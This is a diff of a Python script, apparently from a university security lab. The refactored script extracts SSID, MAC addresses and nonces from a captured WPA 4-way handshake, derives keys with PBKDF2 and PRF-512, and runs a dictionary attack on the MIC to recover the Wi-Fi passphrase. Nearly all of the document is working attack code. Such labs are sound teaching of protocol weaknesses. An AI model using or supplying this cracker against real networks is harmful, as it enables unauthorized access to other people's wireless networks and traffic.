@@ -9,114 +9,149 @@ utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
 sha-1 pour WPA2 ou MD5 pour WPA)
 """
 
-__author__      = "Abraham Rubinstein et Yann Lederrey"
-__copyright__   = "Copyright 2017, HEIG-VD"
-__license__ 	= "GPL"
-__version__ 	= "1.0"
-__email__ 		= "abraham.rubinstein@heig-vd.ch"
-__status__ 		= "Prototype"
+__author__ = "Abraham Rubinstein et Yann Lederrey. Modifié par David Pellissier et Michael Ruckstuhl"
+__copyright__ = "Copyright 2017, HEIG-VD"
+__license__ = "GPL"
+__version__ = "1.0"
+__email__ = "abraham.rubinstein@heig-vd.ch"
+__status__ = "Prototype"
+
+from binascii import b2a_hex, a2b_hex
 
 from scapy.all import *
-from binascii import a2b_hex, b2a_hex
-#from pbkdf2 import pbkdf2_hex
-from pbkdf2 import *
-from numpy import array_split
-from numpy import array
-import hmac, hashlib
 from scapy.contrib.wpa_eapol import WPA_key
 
-def customPRF512(key,A,B):
+from pbkdf2 import *
+
+
+def customPRF512(key, A, B):
     """
     This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
     """
     blen = 64
-    i    = 0
-    R    = b''
-    while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
-        i+=1
-        R = R+hmacsha1.digest()
+    i = 0
+    R = b''
+    while i <= ((blen * 8 + 159) / 160):
+        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
+        i += 1
+        R = R + hmacsha1.digest()
     return R[:blen]
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("wpa_handshake.cap")
 
-test1 = wpa[5][WPA_key]
-test2 = wpa[6][WPA_key]
-test3 = wpa[7][WPA_key]
-test4 = wpa[8][WPA_key]
+def get_association_info(packets):
+    """
+    Returns the SSID, AP_MAC and Client_MAC, which are extracted from the association request
+    """
+    for p in packets:
+        if p.haslayer("Dot11AssoReq"):
+            ssid = p.info
+            ap_mac = a2b_hex(p.addr1.replace(':', ''))
+            client_mac = a2b_hex(p.addr2.replace(':', ''))
+            return ssid, ap_mac, client_mac
 
-# Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
-A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-#ssid        = "SWI"
-ssid = wpa[3].info.decode()
-#APmac       = a2b_hex("cebcc8fdcab7")
-APmac = a2b_hex(wpa[3].addr1.replace(':', ''))
-#Clientmac   = a2b_hex("0013efd015bd")
-Clientmac = a2b_hex(wpa[3].addr2.replace(':', ''))
-
-# Authenticator and Supplicant Nonces
-#ANonce      = a2b_hex("90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91")
-#SNonce      = a2b_hex("7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577")
-ANonce = test3.nonce
-SNonce = test4.nonce
-
-# This is the MIC contained in the 4th frame of the 4-way handshake
-# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-#mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
-mic_to_test = test4.wpa_key_mic
-
-B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
-
-data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
-#data = bytes(test4.underlayer)
-
-print ("\n\nValues used to derivate keys")
-print ("============================")
-print ("SSID: ",ssid,"\n")
-print ("AP Mac: ",b2a_hex(APmac),"\n")
-print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
-print ("AP Nonce: ",b2a_hex(ANonce),"\n")
-print ("Client Nonce: ",b2a_hex(SNonce),"\n")
-print ("Data: ",b2a_hex(data),"\n")
-print ("MIC to TEST: ",b2a_hex(mic_to_test),"\n")
-
-ssid = str.encode(ssid)
-count = 0
-
-# read dictionnary
-file1 = open('WiFi-WPA/probable-v2-wpa-top4800.txt', 'r')
-Lines = file1.readlines()
-
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-while 1:
-
-    # next word
-    passPhrase = Lines[count].strip()
-    passPhrase = str.encode(passPhrase)
-    count += 1
-
-    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
-
-    #expand pmk to obtain PTK
-    ptk = customPRF512(pmk,str.encode(A),B)
-
-    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+    raise Exception("Couldn't find WPA association")
 
 
-    #print ("\nResults of the key expansion")
-    #print ("=============================")
-    #print ("PMK:\t\t",pmk.hex(),"\n")
-    #print ("PTK:\t\t",ptk.hex(),"\n")
-    #print ("KCK:\t\t",ptk[0:16].hex(),"\n")
-    #print ("KEK:\t\t",ptk[16:32].hex(),"\n")
-    #print ("TK:\t\t",ptk[32:48].hex(),"\n")
-    #print ("MICK:\t\t",ptk[48:64].hex(),"\n")
-    print (mic.hexdigest())
+def get_hand_shake(packets):
+    """
+    returns an array containing the 4-way handshake WPA_key layers
+    """
+    handshake = []
+    for p in packets:
+        if p.haslayer(WPA_key):
+            handshake.append(p[WPA_key])
 
-    if str(mic_to_test) == mic.hexdigest():
-        print("Yeah, passphrase foundes: ", passPhrase)
-        break
+    if len(handshake) != 4:
+        raise Exception("Couldn't find all 4 packets of the handshake")
 
+    return handshake
+
+
+def mic_bruteforce(A, B, ssid, data, mic_expected, wordlist):
+    """
+    Try to find a collision with the expected mic, using the wordlist.
+    """
+
+    with open(wordlist) as file1:
+
+        mic_expected = b2a_hex(mic_expected)
+
+        for passphrase in file1:
+
+            passphrase = passphrase.strip()  # removes \n
+            passphrase = str.encode(passphrase)
+
+            # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+            pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
+
+            # expand pmk to obtain PTK
+            ptk = customPRF512(pmk, str.encode(A), B)
+
+            # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+            mic = hmac.new(ptk[0:16], data, hashlib.sha1)
+            mic_guess = bytes(mic.hexdigest(), "utf-8")[:-8]
+
+            print(f"\r{passphrase.decode():20} = {mic_guess}          ", end="", flush=True)
+
+            if mic_guess == mic_expected:
+                print("")
+                return passphrase.decode()
+    print("")
+    return None
+
+
+def main(pcap_file, dictionary):
+    # Read capture file -- it contains beacon, authentication, association, handshake and data
+    wpa = rdpcap(pcap_file)
+
+    # Important parameters for key derivation - most of them can be obtained from the pcap file
+    ssid, ap_mac, client_mac = get_association_info(wpa)
+    A = "Pairwise key expansion"  # this string is used in the pseudo-random function
+
+    handshake = get_hand_shake(wpa)
+    hs1 = handshake[0]
+    hs2 = handshake[1]
+    hs3 = handshake[2]
+    hs4 = handshake[3]
+
+    # Authenticator and Supplicant Nonces
+    a_nonce = hs1.nonce
+    s_nonce = hs2.nonce
+
+    # This is the MIC contained in the 4th frame of the 4-way handshake
+    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
+    mic_to_test = hs4.wpa_key_mic
+
+    B = min(ap_mac, client_mac) \
+        + max(ap_mac, client_mac) \
+        + min(a_nonce, s_nonce) \
+        + max(a_nonce, s_nonce)  # used in pseudo-random function
+
+    hs4.wpa_key_mic = ""  # set MIC bytes to 0
+    data = bytes(hs4.underlayer)
+
+    print("Values used to derivate keys:")
+    print("SSID:        ", ssid)
+    print("AP Mac:      ", b2a_hex(ap_mac))
+    print("CLient Mac:  ", b2a_hex(client_mac))
+    print("AP Nonce:    ", b2a_hex(a_nonce))
+    print("Client Nonce:", b2a_hex(s_nonce))
+    print("Data:        ", b2a_hex(data))
+
+    # Bruteforce
+    print("\nBruteforcing MIC")
+    print("============================")
+    print("Expected MIC:         ", b2a_hex(mic_to_test))
+    passphrase = mic_bruteforce(A, B, ssid, data, mic_to_test, dictionary)
+
+    if passphrase:
+        print("Found passphrase:", passphrase)
+    else:
+        print("Couldn't find the passphrase with this word list.")
+
+
+if __name__ == "__main__":
+    # We could add these as program args
+    pcap_file = "wpa_handshake.cap"
+    dictionary = "wordlists/french.txt"  # https://github.com/Taknok/French-Wordlist
+    main(pcap_file, dictionary)
